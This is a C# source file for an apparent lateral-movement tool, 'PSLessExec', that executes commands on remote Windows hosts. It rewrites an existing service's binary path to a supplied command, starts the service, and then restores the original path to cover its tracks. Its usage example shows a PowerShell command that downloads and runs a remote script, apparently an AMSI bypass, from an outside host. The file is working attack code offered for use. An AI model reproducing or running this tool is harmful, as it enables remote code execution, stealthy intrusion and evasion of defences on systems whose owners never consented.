using System;
using System.Runtime.InteropServices;

namespace lat
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        //
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct QUERY_SERVICE_CONFIG
        {
            public uint dwServiceType;
            public uint dwStartType;
            public uint dwErrorControl;
            public IntPtr lpBinaryPathName;
            public IntPtr lpLoadOrderGroup;
            public uint dwTagId;
            public IntPtr lpDependencies;
            public IntPtr lpServiceStartName;
            public IntPtr lpDisplayName;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool QueryServiceConfig(
            IntPtr hService,
            IntPtr lpServiceConfig,
            uint cbBufSize,
            out uint pcbBytesNeeded
        );
        //
        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Example: PSLessExec.exe [Target] [Service] [BinaryToRun]");
                Console.WriteLine("PSLessExec.exe 127.0.0.1 vds \"cmd.exe /c powershell.exe -c iex (iwr -usebasicparsing http://192.168.3.20:81/amsi.txt);\"");
                return;
            }
            string target = args[0];
            string ServiceName = args[1];
            string payload = args[2];


            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
            uint bytesNeeded = 0;
            QueryServiceConfig(schService, IntPtr.Zero, 0, out bytesNeeded);

            IntPtr ptr = Marshal.AllocHGlobal((int)bytesNeeded);

            if (!QueryServiceConfig(schService, ptr, bytesNeeded, out bytesNeeded))
            {
                Console.WriteLine("QueryServiceConfig failed");
                return;
            }

            QUERY_SERVICE_CONFIG qsc = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, typeof(QUERY_SERVICE_CONFIG));
            string originalPath = Marshal.PtrToStringAuto(qsc.lpBinaryPathName);

            Console.WriteLine("Original Path: " + originalPath);
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);

            // Восстановление оригинального пути
            bool restoreResult = ChangeServiceConfigA(
                schService,
                0xffffffff,
                3,
                0,
                originalPath,
                null,
                null,
                null,
                null,
                null,
                null
            );

            Console.WriteLine("Restored: " + restoreResult);


        }
    }
}